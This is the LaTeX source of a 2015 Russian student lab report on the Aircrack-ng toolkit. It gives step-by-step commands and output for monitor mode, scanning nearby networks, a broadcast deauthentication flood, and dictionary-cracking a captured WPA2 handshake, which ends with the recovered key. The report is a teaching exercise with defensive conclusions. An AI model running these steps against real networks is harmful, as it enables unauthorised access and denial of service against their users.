\documentclass{article}
\usepackage[utf8]{inputenc}
\usepackage[russian]{babel}
\usepackage[left=2cm,right=2cm,top=2cm,bottom=2cm,bindingoffset=0cm
]{geometry}
\usepackage{cmap}
\usepackage{fancyvrb}
\usepackage{graphicx}
\graphicspath{{pictures/}}
\DeclareGraphicsExtensions{.pdf,.png,.jpg}
\DefineShortVerb{\|}

\begin{document}

\begin{titlepage} \begin{center}

	\Large			
Санкт-Петербургский политехнический университет Петра Великого
			
	\vspace{0.2cm}	
Институт информационных технологий и управления
		
	\vspace{2cm} \vfill \huge
Набор инструментов для аудита беспроводных сетей AirCrack
		
	\vfill 
	\begin{flushleft} \large \hangindent=8cm \hangafter=0
Выполнил: Сухинин А.А. гр. 53501/3 \hrulefill
			
Принял: Выглежанина К.Д. \hrulefill
	\end{flushleft}
		
	\vspace{2cm} \vfill \LARGE
2015 г.
		
\end{center} \end{titlepage}

\section{Цель работы}
~

Изучить основные возможности пакета AirCrack и принципы взлома WPA/WPA2 PSK и WEP.

\section{Ход работы}
\subsection{Изучение}

\paragraph{Изучить основные возможности пакета AirCrack и принципы взлома WPA/WPA2 PSK и WEP}

\begin{enumerate}
\item Airodump-ng - программа предназначенная для захвата сырых пакетов протокола 802.11 и особенно подходящая для сбора WEP IVов (Векторов Инициализации) с последующим их использованием в aircrack-ng. Если к вашему компьютеру подсоединен GPS навигатор
то airodump-ng способен отмечать координаты точек на картах

\item Aireplay-ng - Основная функция программы заключается в генерации трафика для последующего использования в aircrack-ng для взлома WEP и WPA-PSK ключей.

\item Aircrack-ng - Взламывает ключи WEP и WPA (Перебор по словарю).
\end{enumerate}

\paragraph{Запустить режим мониторинга на беспроводном интерфейсе}

\begin{verbatim}
crazy-mini alex # airmon-ng start wlan0

Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
1527	wpa_supplicant
15384	avahi-daemon
15386	avahi-daemon
15421	NetworkManager
15431	dhclient
Process with PID 15431 (dhclient) is running on interface wlan0

Interface	Chipset		Driver

mon0		Atheros 	ath9k - [phy0]
mon1		Atheros 	ath9k - [phy0]
wlan0		Atheros 	ath9k - [phy0]
				(monitor mode enabled on mon2
\end{verbatim}

\paragraph{Запустить утилиту airodump, изучить формат вывода этой утили-ты, форматы файлов, которые она может создавать}
~

При указании ключа --write, утилита создает набор файлов с заданным префиксом. Два из которых связаны с информацией о доступных сетях и представлены в двух форматах: csv и xml. Еще два фала содержать информацию о перехваченных пакетах. Файл типа .cap содержит перехваченные пакеты, в то время как csv содержит лишь сокращенную информацию. Стоит отметить, что csv - это формат хранения простой таблицы.

\subsection{Практическое задание}

\paragraph{Запустить режим мониторинга на беспроводном интерфейсе}
~

\begin{verbatim}
crazy-mini alex # airodump-ng mon2

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  
 CIPHER AUTH ESSID                                                                                  
 1C:7E:E5:39:26:F8  -42      162      246   29   4  54e. WPA2 
 CCMP   PSK  18     7C:03:D8:98:4A:5C  -44        1        0    0  
 11  54e  WPA  CCMP   PSK  ROSTE  10:9A:DD:86:FE:15  -65        2        
 0    0  11  54e. WPA2 CCMP   PSK  z46ne  70:62:B8:89:DD:FC  -70        
 2        0    0  10  54e  WPA2 CCMP   PSK  WPlus  E0:CB:
 4E:D2:D9:B9  -71        2        0    0  11  54   WEP  WEP         
 ALTIN 
 08:60:6E:BC:2E:00  -72        1        0    0  11  54e  WPA2 CCMP   PSK  home  
 D4:21:22:17:25:08  -73        2        0    0   7  54e  WPA2 CCMP   PSK  Sidor 
 60:A4:4C:D0:DD:BC  -74      134       45    0   6  54e  WPA2 CCMP   PSK  ASUS  
 00:26:5A:A0:84:84  -78       17        0    0   6  54e. WPA2 CCMP   PSK  leabe 
 10:9A:DD:86:FE:16  -81        1        0    0 149  54e  WPA2 CCMP   PSK  z46ne  
\end{verbatim}
\paragraph{Запустить сбор трафика для получения аутентификационных сообщений}
~

\begin{verbatim}
crazy-mini alex # airodump-ng mon2 --write airdump --bssid 1C:7E:E5:39:26:F8  -c 4


 CH  4 ][ BAT: 1 hour 12 mins ][ Elapsed: 12 s ][ 2015-06-03 20:41 ][ fixed channel mon2: -1    
                                                                                                
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID             
                                                                                                
 1C:7E:E5:39:26:F8  -83 100      137      380   58   4  54e. WPA2 CCMP   PSK  18                 
                                                                                                
 BSSID              STATION            PWR   Rate    Lost  Packets  Probes                      
                                                                                                
1C:7E:E5:39:26:F8  C0:18:85:9E:54:0B    0    0e- 1e     0        3                              
1C:7E:E5:39:26:F8  28:9A:FA:42:18:65   18    0e- 1      1        4                               
1C:7E:E5:39:26:F8  74:E5:43:65:15:F5  -127    0e- 0e     0      374   
\end{verbatim}

\paragraph{Произвести деаутентификацию одного из клиентов, до
тех пор, пока не удастся собрать необходимых для взлома аутенти-фикационных сообщений}
~

\begin{verbatim}
crazy-mini alex # aireplay-ng --ignore-negative-one --deauth 150 
-a 1C:7E:E5:39:26:F8 -h 7C:03:D8:98:4A:5C mon0
The interface MAC (C0:18:85:9E:54:0B) doesn't match the specified MAC (-h).
	ifconfig mon0 hw ether 7C:03:D8:98:4A:5C
21:27:51  Waiting for beacon frame (BSSID: 1C:7E:E5:39:26:F8) on channel -1
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
21:27:51  Sending DeAuth to broadcast -- BSSID: [1C:7E:E5:39:26:F8]
21:27:52  Sending DeAuth to broadcast -- BSSID: [1C:7E:E5:39:26:F8]
21:27:52  Sending DeAuth to broadcast -- BSSID: [1C:7E:E5:39:26:F8]
21:27:53  Sending DeAuth to broadcast -- BSSID: [1C:7E:E5:39:26:F8]
21:27:53  Sending DeAuth to broadcast -- BSSID: [1C:7E:E5:39:26:F8]
\end{verbatim}

В результате перехватываем пакет handshake:

\begin{verbatim}
crazy-mini alex # airodump-ng mon0 --bssid 1C:7E:E5:39:26:F8 -c 6 
--write dump --ignore-negative-one
 CH  6 ][ Elapsed: 1 min ][ 2015-06-03 21:30 ][ WPA handshake: 1C:7E:E5:39:26:F
                                                                               
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH E
                                                                               
 1C:7E:E5:39:26:F8  -47 100      880      791    4   4  54e. WPA2 CCMP   PSK  11
                                                                               
 BSSID              STATION            PWR   Rate    Lost  Packets  Probes     
                                                                               
 1C:7E:E5:39:26:F8  74:E5:43:65:15:F5  -32    0e- 1      0      645  18   
\end{verbatim}

\paragraph{Произвести взлом используя словарь паролей}
~

Так как используемый пароль слишком сложный, в некоторую часть словаря был вставлен искомый пароль.

\begin{verbatim}
crazy-mini alex # aircrack-ng dump-05.cap -w English.dic 
Opening dump-05.cap
Read 20931 packets.

   #  BSSID              ESSID                     Encryption

   1  1C:7E:E5:39:26:F8  18                        WPA (1 handshake)

Choosing first network as target.

Opening dump-05.cap
Reading packets, please wait...

                                 Aircrack-ng 1.1


                   [00:01:51] 91444 keys tested (845.44 k/s)


                         KEY FOUND! [ execombat112 ]


      Master Key     : CB A9 50 ED 43 34 9F 6E C1 CD 22 48 71 3C 21 F3 
                       7D 11 CE BF 37 E0 B4 62 CE 4B EC 03 32 DB 47 B1 

      Transient Key  : 9B 6F B4 1A E5 6C E0 96 13 BD CB 53 47 F5 E6 AE 
                       74 18 DC B4 6B 74 CE AF CD 52 B1 E8 A3 00 73 B8 
                       43 D3 84 3B C2 74 7C 4E BE 74 3B A5 80 5D 4F 92 
                       25 8C 45 86 45 97 1A 41 E6 58 18 9E 94 FE 1C BB 

      EAPOL HMAC     : 23 38 A3 41 34 98 88 00 4C 73 54 67 39 E9 DB 87 
\end{verbatim}

\section{Выводы}

В ходе данной работы были изучены основные возможности пакеты Air Crack и принципы взлома WPA/WPA2 PSK. Данный инструмент позволяет прослушивать пакеты, генерировать новые и на основе handshake осуществлять взлом пароля сети. Следует отметить, что пароли, отвечающие требованиям не представляется возможном взломать, так как единственный возможный вариант - это перебор паролей. Таким образом, нельзя сказать, что протокол WPA уязвим на данный момент. С другой стороны, гораздо большей проблемой является возможность деаутентифицировать пользователя любой сети. Данная возможность открывает возможность атаки с целью отказа в обслуживании.

В общем случае, следует отметить, что защита беспроводных сетей непростая задача и в качестве меры для базового обеспечения безопасности не следует использовать протокол WEP и простые пароли.
 
\end{document}